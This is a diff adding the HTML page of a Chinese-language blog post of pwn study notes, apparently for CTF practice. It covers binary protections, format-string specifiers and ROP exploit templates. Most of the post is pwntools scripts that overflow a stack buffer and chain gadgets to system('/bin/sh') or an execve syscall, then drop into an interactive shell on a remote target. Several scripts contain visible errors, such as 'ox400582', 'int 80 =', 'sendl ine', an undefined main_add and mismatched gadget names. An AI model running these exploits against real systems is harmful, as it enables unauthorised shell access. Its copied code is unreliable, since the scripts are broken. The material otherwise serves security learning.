@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="基础知识checksec  RELRO设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。说明我们对GOT表具有写权限. Canary 不能直接使用栈溢出 NXNX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn笔记">
+<meta property="og:url" content="http://yoursite.com/2019/08/15/test/index.html">
+<meta property="og:site_name" content="WOWrice">
+<meta property="og:description" content="基础知识checksec  RELRO设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。说明我们对GOT表具有写权限. Canary 不能直接使用栈溢出 NXNX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2019/08/14/BIDV8X76iuTlbGe.png">
+<meta property="og:updated_time" content="2019-08-15T04:38:54.876Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pwn笔记">
+<meta name="twitter:description" content="基础知识checksec  RELRO设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。说明我们对GOT表具有写权限. Canary 不能直接使用栈溢出 NXNX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面">
+<meta name="twitter:image" content="https://i.loli.net/2019/08/14/BIDV8X76iuTlbGe.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/15/test/">
+
+
+
+
+
+  <title>Pwn笔记 | WOWrice</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WOWrice</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">直到你看见那片海</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/15/test/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Everly">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WOWrice">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Pwn笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-15T00:00:00+08:00">
+                2019-08-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="https://i.loli.net/2019/08/14/BIDV8X76iuTlbGe.png" alt="checksec.png"></p>
+<ul>
+<li>RELRO<br>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。<strong>说明我们对GOT表具有写权限.</strong></li>
+<li>Canary<br> <strong>不能直接使用栈溢出</strong></li>
+<li>NX<br>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</li>
+<li>PIE<br> <strong>地址空间分布随机化</strong></li>
+</ul>
+<h2 id="常用基本的格式化字符串参数介绍"><a href="#常用基本的格式化字符串参数介绍" class="headerlink" title="常用基本的格式化字符串参数介绍"></a>常用基本的格式化字符串参数介绍</h2><table>
+<thead>
+<tr>
+<th align="center">字符</th>
+<th>功能</th>
+<th>详解</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">%c</td>
+<td>输出字符</td>
+<td>配上%n可用于向指定地址写数据</td>
+</tr>
+<tr>
+<td align="center">%d</td>
+<td>输出十进制整数</td>
+<td>配上%n可用于向指定地址写数据</td>
+</tr>
+<tr>
+<td align="center">%x</td>
+<td>输出16进制数据</td>
+<td>如%i$x表示要泄漏偏移i处4字节长的16进制数据</td>
+</tr>
+<tr>
+<td align="center">%p</td>
+<td>输出16进制数据</td>
+<td>附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节</td>
+</tr>
+<tr>
+<td align="center">%s</td>
+<td>输出的内容是字符串</td>
+<td>即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串</td>
+</tr>
+<tr>
+<td align="center">%n</td>
+<td>将已经打印的字符个数赋值给偏移处指针所指向的地址位置</td>
+<td>如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节</td>
+</tr>
+</tbody></table>
+<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h4 id="有system有bin-sh"><a href="#有system有bin-sh" class="headerlink" title="有system有bin/sh"></a>有system有bin/sh</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'0.0.0.0'</span>,<span class="number">12345</span>)</span><br><span class="line">system1 = <span class="number">0x08048320</span></span><br><span class="line">bin1 = <span class="number">0x0804A024</span></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x8c</span>+ p32(system1) + p32(<span class="number">0</span>)+ p32(bin1)</span><br><span class="line"><span class="comment">#填充值/返回函数/函数结束地址/指向”/bin/sh“</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="有system无bin-sh"><a href="#有system无bin-sh" class="headerlink" title="有system无bin/sh"></a>有system无bin/sh</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'0.0.0.0'</span>,<span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./名称'</span>)</span><br><span class="line">scanf_add = p32(elf.symbols[<span class="string">'__isoc99_scanf'</span>])</span><br><span class="line">format_s = p32(<span class="number">0x08045201</span>)</span><br><span class="line"><span class="comment">#%s地址</span></span><br><span class="line">binsh_add = p32(<span class="number">0x0804a030</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'A'</span>*<span class="number">0x34</span> + scanf_add + main_add + format_s + binsh_add</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="无system"><a href="#无system" class="headerlink" title="无system"></a>无system</h4><p>找出溢出点后可使用<br><code>ROPgadget --binary pwn名字 | grep &quot;int 0x80&quot;</code><br>来寻找可使用的gadget  ， <strong>-binary是搜索的目录，-only是搜索的内容</strong> ，同样还可以寻找pppr<br><code>ROPgadget --binary pwn名字 --only &quot;pop|ret&quot;</code><br><strong>使用的地址避免出现0a这样的字符，例如0x080a150a！！！</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">'0.0.0.0'</span>, <span class="number">10001</span>)</span><br><span class="line">ppppr = <span class="number">0x080a150a</span>       <span class="comment">#pop eax; pop ebx; pop esi; pop edi; ret</span></span><br><span class="line">pppr = <span class="number">0x080733b0</span>        <span class="comment">#pop edx; pop ecx; pop ebx; ret</span></span><br><span class="line">int <span class="number">80</span> = <span class="number">0x08071005</span>      <span class="comment">#int 0x80</span></span><br><span class="line">binsh = <span class="number">0x080f1a20</span>       <span class="comment">#first_ name address ,溢出点</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">32</span>         <span class="comment">#padding</span></span><br><span class="line">payload += p32(pppr)     <span class="comment">#pop eax; pop ebx; pop esi; pop edi; ret</span></span><br><span class="line">payload += p32(<span class="number">0xb</span>)      <span class="comment">#eax= 0xb</span></span><br><span class="line">payload += p32(binsh)    <span class="comment">#ebx = &amp;("/bin/sh")</span></span><br><span class="line">payload += p32(<span class="number">0</span>)        <span class="comment">#esi=0</span></span><br><span class="line">payload += p32(<span class="number">0</span>)        <span class="comment">#edi=0</span></span><br><span class="line">payload += p32(pppr)     <span class="comment">#pop edx; pop ecx; pop ebx; ret</span></span><br><span class="line">payload += p32(<span class="number">0</span>)        <span class="comment">#edx=0</span></span><br><span class="line">payload += p32(<span class="number">0</span>)        <span class="comment">#ecx = 0</span></span><br><span class="line">payload += p32(binsh)    <span class="comment">#ebx = &amp;("/bin/sh")</span></span><br><span class="line">payload += p32(int_ <span class="number">80</span>)  <span class="comment">#int Bx80</span></span><br><span class="line">io. sendline(<span class="string">"/bin/sh"</span>)  <span class="comment">#first_ name里面存储”/bin/sh"</span></span><br><span class="line">io. sendline(<span class="string">"A"</span>)        <span class="comment">#随便输入</span></span><br><span class="line">io. sendline(<span class="string">"A"</span>)        <span class="comment">#随便输入</span></span><br><span class="line">io. sendline(<span class="string">"y"</span>)        <span class="comment">#选y进入函数first_ day_ corps()</span></span><br><span class="line">io. sendline(<span class="string">"2"</span>)        <span class="comment">#选项2进入change major()， 触发栈溢出</span></span><br><span class="line"></span><br><span class="line">io . sendl ine(payload)</span><br><span class="line">io. interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>在x64下通常参数从左到右依次放在 <strong>rdi,rsi,rdx,rcx,r8,r9</strong></p>
+<h4 id="有sys无binsh有sh"><a href="#有sys无binsh有sh" class="headerlink" title="有sys无binsh有sh"></a>有sys无binsh有sh</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'0.0.0.0'</span>,<span class="number">10000</span>)</span><br><span class="line">system_add = <span class="number">0x4007505</span></span><br><span class="line">binsh = <span class="number">0x400236</span>            <span class="comment">#字符串“sh”在内存中的位置</span></span><br><span class="line">pop_rdi = ox400582          <span class="comment">#pop rdi ; retn</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">88</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system_add)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<center> ~~未完待续~~ </center>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Everly</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#checksec"><span class="nav-number">1.1.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用基本的格式化字符串参数介绍"><span class="nav-number">1.2.</span> <span class="nav-text">常用基本的格式化字符串参数介绍</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ROP"><span class="nav-number">2.</span> <span class="nav-text">ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#32位"><span class="nav-number">2.1.</span> <span class="nav-text">32位</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#有system有bin-sh"><span class="nav-number">2.1.0.1.</span> <span class="nav-text">有system有bin/sh</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#有system无bin-sh"><span class="nav-number">2.1.0.2.</span> <span class="nav-text">有system无bin/sh</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#无system"><span class="nav-number">2.1.0.3.</span> <span class="nav-text">无system</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#64位"><span class="nav-number">2.2.</span> <span class="nav-text">64位</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#有sys无binsh有sh"><span class="nav-number">2.2.0.1.</span> <span class="nav-text">有sys无binsh有sh</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Everly</span>
+
+  
+</div>
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  traveller:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" color="255,255,255" opacity="0.7" zindex="-2" count="110" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
